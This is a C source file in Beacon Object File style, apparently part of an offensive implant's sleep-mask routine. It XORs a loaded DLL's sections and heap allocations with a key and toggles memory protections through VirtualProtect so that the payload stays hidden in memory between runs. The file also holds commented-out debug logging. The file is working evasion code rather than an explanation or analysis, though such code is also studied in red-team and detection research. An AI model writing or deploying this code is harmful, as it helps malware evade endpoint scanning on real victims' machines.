#include <windows.h>
#include "memory.h"

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileA(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);
DECLSPEC_IMPORT BOOL KERNEL32$WriteFile(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);
DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(
  HANDLE hObject
);
DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();

char xorkey [ 128 ] = { 1 };

void apply_mask ( char * data, DWORD len )
{
    for ( DWORD i = 0; i < len; i++ ) {
        data [ i ] ^= xorkey [ i % 128 ];
    }
}

BOOL is_writeable ( DWORD protection )
{
    if ( protection == PAGE_EXECUTE_READWRITE ||
         protection == PAGE_EXECUTE_WRITECOPY ||
         protection == PAGE_READWRITE ||
         protection == PAGE_WRITECOPY )
    {
        return TRUE;
    }

    return FALSE;
}


/*static void write_string(HANDLE file, const char * str)
{
    DWORD written = 0;
    SIZE_T len = 0;

    while (str[len])
        len++;

    KERNEL32$WriteFile(
        file,
        str,
        (DWORD)len,
        &written,
        NULL
    );
}

static void uint64_to_hex(ULONG_PTR value, CHAR * out)
{
    CHAR hex[] = "0123456789ABCDEF";
    CHAR temp[32];
    INT i = 0;
    INT j = 0;

    if (value == 0)
    {
        out[0] = '0';
        out[1] = 0;
        return;
    }

    while (value > 0)
    {
        temp[i++] = hex[value & 0xF];
        value >>= 4;
    }

    while (i > 0)
    {
        out[j++] = temp[--i];
    }

    out[j] = 0;
}

static void uint64_to_dec(ULONG_PTR value, CHAR * out)
{
    CHAR temp[32];
    INT i = 0;
    INT j = 0;

    if (value == 0)
    {
        out[0] = '0';
        out[1] = 0;
        return;
    }

    while (value > 0)
    {
        temp[i++] = '0' + (value % 10);
        value /= 10;
    }

    while (i > 0)
    {
        out[j++] = temp[--i];
    }

    out[j] = 0;
}

static void log_virtualprotect(
    HANDLE file,
    PVOID base,
    SIZE_T size,
    DWORD old_protect,
    DWORD new_protect,
    DWORD error_code
)
{
    CHAR buffer[64];

    error_code = KERNEL32$GetLastError();
    write_string(file, "[VirtualProtect] Base=0x");

    uint64_to_hex((ULONG_PTR)base, buffer);
    write_string(file, buffer);

    write_string(file, " Size=");
    uint64_to_dec((ULONG_PTR)size, buffer);
    write_string(file, buffer);

    uint64_to_hex(old_protect, buffer);
    write_string(file, " Old=");
    write_string(file, (buffer));

    uint64_to_hex(new_protect, buffer);
    write_string(file, " New=");
    write_string(file, (buffer));

    write_string(file, " Result=");

    write_string(file, "FAILED Error=0x");
    uint64_to_hex((ULONG_PTR)error_code, buffer);
    write_string(file, buffer);

    write_string(file, "\r\n");
}*/

void xor_section ( MEMORY_SECTION * section, BOOL mask )
{
    /*DWORD error_code;
    HANDLE fi = KERNEL32$CreateFileA(
        "C:\\Users\\user\\log.txt",
        FILE_APPEND_DATA,
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        0
    );*/

    if ( mask == TRUE && is_writeable ( section->CurrentProtect ) == FALSE )
    {
        DWORD old_protect = 0;
        BOOL vp_result = FALSE;
        do {
            vp_result = KERNEL32$VirtualProtect(
                section->BaseAddress,
                section->Size,
                PAGE_READWRITE,
                &old_protect
            );

            /*if (fi != INVALID_HANDLE_VALUE && !vp_result)
            {
                error_code = KERNEL32$GetLastError();

                log_virtualprotect(
                    fi,
                    section->BaseAddress,
                    section->Size,
                    section->CurrentProtect,
                    PAGE_READWRITE,
                    error_code
                );
            }*/

            if ( vp_result )
            {
                section->CurrentProtect  = PAGE_READWRITE;
                section->PreviousProtect = old_protect;
            }
        }while(!vp_result);
    }

    if ( is_writeable ( section->CurrentProtect ) )
    {
        apply_mask ( section->BaseAddress, section->Size );
    }

    if ( mask == FALSE && section->CurrentProtect != section->PreviousProtect )
    {
        DWORD old_protect = 0;
        BOOL vp_result = FALSE;
        do {
            vp_result = KERNEL32$VirtualProtect(
                section->BaseAddress,
                section->Size,
                section->PreviousProtect,
                &old_protect
            );

            /*if (fi != INVALID_HANDLE_VALUE && !vp_result)
            {
                error_code = KERNEL32$GetLastError();
                log_virtualprotect(
                    fi,
                    section->BaseAddress,
                    section->Size,
                    section->CurrentProtect,
                    section->PreviousProtect,
                    error_code
                );
            }*/

            if ( vp_result )
            {
                section->CurrentProtect  = section->PreviousProtect;
                section->PreviousProtect = old_protect;
            }
        }while(!vp_result);
    }

    /*if (fi != INVALID_HANDLE_VALUE)
    {
        KERNEL32$CloseHandle(fi);
    }*/
}

void xor_dll ( DLL_MEMORY * region, BOOL mask )
{
    for ( size_t i = 0; i < region->Count; i++ ) {
        xor_section ( &region->Sections [ i ], mask );
    }
}

void xor_heap ( HEAP_MEMORY * heap )
{
    for ( size_t i = 0; i < heap->Count; i++ )
    {
        HEAP_RECORD * record = &heap->Records [ i ];

        /* these are already RW */
        apply_mask ( record->Address, record->Size );
    }
    
}

void mask_memory ( MEMORY_LAYOUT * memory, BOOL mask )
{
    xor_dll  ( &memory->Dll, mask );
    xor_heap ( &memory->Heap );
}